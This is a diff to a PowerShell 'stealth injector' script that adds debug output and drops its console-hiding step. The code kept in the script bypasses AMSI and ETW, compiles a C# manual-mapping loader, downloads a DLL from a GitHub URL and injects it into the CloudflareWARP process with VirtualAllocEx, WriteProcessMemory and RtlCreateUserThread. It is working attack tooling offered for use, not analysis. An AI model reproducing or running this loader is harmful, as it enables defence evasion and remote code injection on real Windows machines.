@@ -4,9 +4,9 @@ param()
 Set-StrictMode -Version Latest
 
 # ============================================================
-# ★★★ DEBUG MODE (shows all messages on screen) ★★★
+# ★★★ DEBUG MODE — Console will stay visible ★★★
 # ============================================================
-$DebugMode = $true   # set to $false to hide messages
+$DebugMode = $true
 
 function Write-DebugInfo {
     param($Message, $Color = "Cyan")
@@ -18,38 +18,25 @@ function Write-DebugInfo {
 # ============================================================
 # ★★★ START ★★★
 # ============================================================
+Write-Host "========================================" -ForegroundColor Magenta
+Write-Host "      STEALTH INJECTOR (DEBUG MODE)     " -ForegroundColor Magenta
+Write-Host "========================================" -ForegroundColor Magenta
 Write-DebugInfo "Script starting..." -Color "Green"
 
 # --- Admin check ---
 if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
 {
     Write-DebugInfo "❌ Not running as Administrator! Exiting." -Color "Red"
+    Read-Host "Press ENTER to exit"
     exit
 } else {
     Write-DebugInfo "✅ Running as Administrator." -Color "Green"
 }
 
 # ============================================================
-# ★★★ 1. Console Hide (SKIP in debug mode) ★★★
+# ★★★ 1. Console Hide — SKIP (keep visible for debug) ★★★
 # ============================================================
-if ($DebugMode) {
-    Write-DebugInfo "Console will stay visible (debug mode)." -Color "Yellow"
-} else {
-    Write-DebugInfo "Attempting to hide console window..." -Color "Yellow"
-    try {
-        Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@ -ErrorAction Stop
-        $consoleHandle = [Console.Window]::GetConsoleWindow()
-        [Console.Window]::ShowWindow($consoleHandle, 0)
-        Write-DebugInfo "✅ Console hidden." -Color "Green"
-    } catch {
-        Write-DebugInfo "⚠️ Failed to hide console: $_" -Color "Red"
-    }
-}
+Write-DebugInfo "Console will stay visible (debug mode)." -Color "Yellow"
 
 # ============================================================
 # ★★★ 2. AMSI + ETW Bypass ★★★
@@ -81,6 +68,7 @@ try {
     Write-DebugInfo "✅ ETW bypassed." -Color "Green"
 } catch {
     Write-DebugInfo "❌ AMSI/ETW bypass failed: $_" -Color "Red"
+    Read-Host "Press ENTER to exit"
     exit
 }
 
@@ -164,38 +152,67 @@ public static class NativeLoader
     public static bool InjectIntoWarp(byte[] dll)
     {
         try {
+            Console.WriteLine("[C#] Searching for CloudflareWARP process...");
             int pid = 0;
             foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
-            if (pid == 0) throw new Exception("CloudflareWARP process not found");
+            if (pid == 0) {
+                Console.WriteLine("[C#] ERROR: CloudflareWARP process not found.");
+                return false;
+            }
+            Console.WriteLine("[C#] Found CloudflareWARP PID: " + pid);
 
+            Console.WriteLine("[C#] Opening process...");
             IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
-            if (hProc == IntPtr.Zero) throw new Exception("OpenProcess failed");
+            if (hProc == IntPtr.Zero) {
+                Console.WriteLine("[C#] ERROR: OpenProcess failed.");
+                return false;
+            }
+            Console.WriteLine("[C#] Process opened successfully.");
 
+            Console.WriteLine("[C#] Manual mapping DLL...");
             var result = Map(dll, false);
-            if (result.ImageBase == IntPtr.Zero) throw new Exception("Manual mapping failed");
+            if (result.ImageBase == IntPtr.Zero) {
+                Console.WriteLine("[C#] ERROR: Manual mapping failed.");
+                return false;
+            }
+            Console.WriteLine("[C#] Manual mapping successful. ImageBase: 0x" + result.ImageBase.ToString("X"));
 
+            Console.WriteLine("[C#] Allocating memory in WARP process...");
             IntPtr remoteBase = IntPtr.Zero;
             UIntPtr size = (UIntPtr)result.ImageSize;
             remoteBase = VirtualAlloc(hProc, UIntPtr.Zero, (uint)size, MC|MR, PER);
-            if (remoteBase == IntPtr.Zero) throw new Exception("VirtualAllocEx failed");
+            if (remoteBase == IntPtr.Zero) {
+                Console.WriteLine("[C#] ERROR: VirtualAllocEx failed.");
+                return false;
+            }
+            Console.WriteLine("[C#] Memory allocated at: 0x" + remoteBase.ToString("X"));
 
+            Console.WriteLine("[C#] Copying DLL image to remote process...");
             byte[] imageBytes = new byte[result.ImageSize];
             Marshal.Copy(result.ImageBase, imageBytes, 0, (int)result.ImageSize);
             IntPtr bytesWritten;
             WriteProcessMemory(hProc, remoteBase, imageBytes, (uint)result.ImageSize, out bytesWritten);
+            Console.WriteLine("[C#] Copied " + bytesWritten.ToInt64() + " bytes.");
 
             IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (result.DllMainAddr.ToInt64() - result.ImageBase.ToInt64()));
+            Console.WriteLine("[C#] Entry point: 0x" + entryPoint.ToString("X"));
 
+            Console.WriteLine("[C#] Creating remote thread via RtlCreateUserThread...");
             IntPtr hThread;
             int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
-            if (status != 0) throw new Exception("RtlCreateUserThread failed, status=" + status);
+            if (status != 0) {
+                Console.WriteLine("[C#] ERROR: RtlCreateUserThread failed, status=" + status);
+                return false;
+            }
+            Console.WriteLine("[C#] Remote thread created successfully.");
 
             System.Threading.Thread.Sleep(200);
             CloseHandle(hThread);
             CloseHandle(hProc);
+            Console.WriteLine("[C#] Injection complete.");
             return true;
         } catch (Exception ex) {
-            Console.WriteLine("[ERROR] " + ex.Message);
+            Console.WriteLine("[C#] EXCEPTION: " + ex.Message);
             return false;
         }
     }
@@ -303,11 +320,13 @@ try {
     $result = $compiler.CompileAssemblyFromSource($params, $kernel)
     if ($result.Errors.Count -gt 0) {
         Write-DebugInfo "❌ Compilation error: $($result.Errors[0].ErrorText)" -Color "Red"
+        Read-Host "Press ENTER to exit"
         exit
     }
     Write-DebugInfo "✅ C# loader compiled successfully." -Color "Green"
 } catch {
     Write-DebugInfo "❌ Compilation failed: $_" -Color "Red"
+    Read-Host "Press ENTER to exit"
     exit
 }
 
@@ -318,27 +337,32 @@ $method = $loaderType.GetMethod('InjectIntoWarp')
 # ============================================================
 # ★★★ 5. DLL Download ★★★
 # ============================================================
-Write-DebugInfo "Downloading DLL..." -Color "Yellow"
+Write-DebugInfo "Downloading DLL from GitHub..." -Color "Yellow"
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
     Write-DebugInfo "✅ DLL downloaded successfully (size: $($bytes.Length) bytes)" -Color "Green"
 } catch {
     Write-DebugInfo "❌ DLL download failed: $_" -Color "Red"
+    Read-Host "Press ENTER to exit"
     exit
 }
 
 # ============================================================
 # ★★★ 6. Injection Call ★★★
 # ============================================================
-Write-DebugInfo "Attempting injection into Cloudflare WARP..." -Color "Yellow"
+Write-DebugInfo "Calling injection method..." -Color "Yellow"
+Write-Host ""
+Write-Host "========== C# OUTPUT ==========" -ForegroundColor Magenta
 try {
     $success = $method.Invoke($null, @($bytes))
+    Write-Host "=================================" -ForegroundColor Magenta
     if ($success) {
-        Write-DebugInfo "✅ Injection successful!" -Color "Green"
+        Write-DebugInfo "✅ Injection completed successfully!" -Color "Green"
     } else {
-        Write-DebugInfo "❌ Injection failed (see C# error above)" -Color "Red"
+        Write-DebugInfo "❌ Injection failed. Check C# output above." -Color "Red"
     }
 } catch {
+    Write-Host "=================================" -ForegroundColor Magenta
     Write-DebugInfo "❌ Injection call error: $_" -Color "Red"
 }
 
@@ -360,4 +384,3 @@ Write-DebugInfo "✅ Cleanup complete." -Color "Green"
 # ============================================================
 Write-DebugInfo "Script finished. Press ENTER to close this window." -Color "Magenta"
 Read-Host
-# Now the script will exit when user presses Enter.
